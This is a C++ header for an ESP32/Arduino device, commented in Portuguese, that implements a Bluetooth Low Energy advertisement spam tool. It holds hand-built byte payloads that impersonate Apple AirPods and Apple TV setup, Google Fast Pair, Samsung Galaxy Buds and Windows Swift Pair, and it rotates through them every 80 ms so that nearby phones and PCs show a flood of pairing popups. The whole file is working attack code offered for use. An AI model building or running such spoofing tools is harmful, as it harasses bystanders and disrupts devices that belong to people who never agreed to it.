#pragma once
#include <Arduino.h>
#include <NimBLEDevice.h>
#include "../utils/logger.h"

/*
 * BLE Advertisement Spam
 * Faz cycling por pacotes BLE fabricados para Apple, Android (Fast Pair),
 * Samsung, e Windows — dispara notificações/popups em dispositivos próximos.
 */
class BLESpam {
public:
    static BLESpam& get() { static BLESpam inst; return inst; }

    bool running = false;
    uint32_t packetsSent = 0;

    enum Mode {
        MODE_ALL      = 0,
        MODE_APPLE    = 1,
        MODE_ANDROID  = 2,
        MODE_SAMSUNG  = 3,
        MODE_WINDOWS  = 4,
    };
    Mode mode = MODE_ALL;

    void start(Mode m = MODE_ALL) {
        mode    = m;
        running = true;
        packetsSent = 0;
        _idx = 0;
        LOG.warn("[BLE SPAM] Iniciado — modo: " + _modeName(m));
    }

    void stop() {
        running = false;
        NimBLEDevice::getAdvertising()->stop();
        LOG.info("[BLE SPAM] Parado | pacotes: " + String(packetsSent));
    }

    // Chamado no loop (core 1) — não no attackTask para não bloquear
    void tick() {
        if (!running) return;
        static unsigned long next = 0;
        if (millis() < next) return;

        _sendNext();
        packetsSent++;
        next = millis() + 80; // 80ms entre pacotes
    }

private:
    uint8_t _idx = 0;

    struct ADVPayload { const char* name; std::vector<uint8_t> data; };

    // Apple proximity / nearby notification types
    ADVPayload _appleAirpods() {
        return {"AirPods Pro", {
            0x1E, 0xFF,
            0x4C, 0x00, // Apple
            0x07, 0x19, // Proximity Pairing
            0x01, 0x02, // type/flags
            0x20,       // battery status
            0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
        }};
    }
    ADVPayload _appleAirpodsMax() {
        return {"AirPods Max", {
            0x1E, 0xFF,
            0x4C, 0x00,
            0x07, 0x19,
            0x0A, 0x20, // AirPods Max model
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        }};
    }
    ADVPayload _appleTV() {
        return {"Apple TV Setup", {
            0x09, 0xFF,
            0x4C, 0x00,
            0x04, 0x05, // HandOff
            0x00, 0x10, 0x00, 0x00, 0x00, 0x00
        }};
    }
    ADVPayload _applePairing() {
        return {"iPhone Popup", {
            0x09, 0xFF,
            0x4C, 0x00,
            0x0F, 0x05, // Nearby Action
            0xC1,       // action: Apple TV setup
            0x00, 0x10, 0x00, 0x00, 0x00
        }};
    }
    ADVPayload _androidFastPair() {
        // Google Fast Pair service UUID 0xFE2C
        return {"Android Fast Pair", {
            0x03, 0x03, 0x2C, 0xFE, // Service UUID list: FE2C
            0x06, 0x16, 0x2C, 0xFE, // Service data
            0x40, 0x08, 0x04        // Google model ID (Pixel Buds)
        }};
    }
    ADVPayload _samsungGalaxySide() {
        return {"Samsung Galaxy Buds", {
            0x1B, 0xFF,
            0x75, 0x00, // Samsung
            0x42, 0x09, 0x81, 0x02,
            0x14, 0x15, 0x03, 0x21,
            0x01, 0x09, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00,
        }};
    }
    ADVPayload _windowsSwiftPair() {
        return {"Windows Swift Pair", {
            0x09, 0xFF,
            0x06, 0x00, // Microsoft
            0x03,       // Swift Pair
            0x00, 0x80, 0x00,
            0x00, 0x00, 0x00
        }};
    }

    void _sendNext() {
        static const int NUM_ALL = 7;
        ADVPayload pld;
        int slot = _idx % NUM_ALL;
        switch (mode) {
            case MODE_APPLE:   slot = _idx % 4; break;
            case MODE_ANDROID: slot = 4; break;
            case MODE_SAMSUNG: slot = 5; break;
            case MODE_WINDOWS: slot = 6; break;
            default: break;
        }
        switch (slot) {
            case 0: pld = _appleAirpods();    break;
            case 1: pld = _appleAirpodsMax(); break;
            case 2: pld = _appleTV();         break;
            case 3: pld = _applePairing();    break;
            case 4: pld = _androidFastPair(); break;
            case 5: pld = _samsungGalaxySide();break;
            case 6: pld = _windowsSwiftPair();break;
            default: pld = _applePairing();   break;
        }
        _idx++;

        auto* adv = NimBLEDevice::getAdvertising();
        adv->stop();

        NimBLEAdvertisementData data;
        std::string raw(pld.data.begin(), pld.data.end());
        data.addData(raw);

        adv->setAdvertisementData(data);
        adv->setMinInterval(20);
        adv->setMaxInterval(30);
        adv->start(0);
    }

    static String _modeName(Mode m) {
        switch (m) {
            case MODE_APPLE:   return "Apple";
            case MODE_ANDROID: return "Android Fast Pair";
            case MODE_SAMSUNG: return "Samsung";
            case MODE_WINDOWS: return "Windows Swift Pair";
            default:           return "Todos";
        }
    }
};
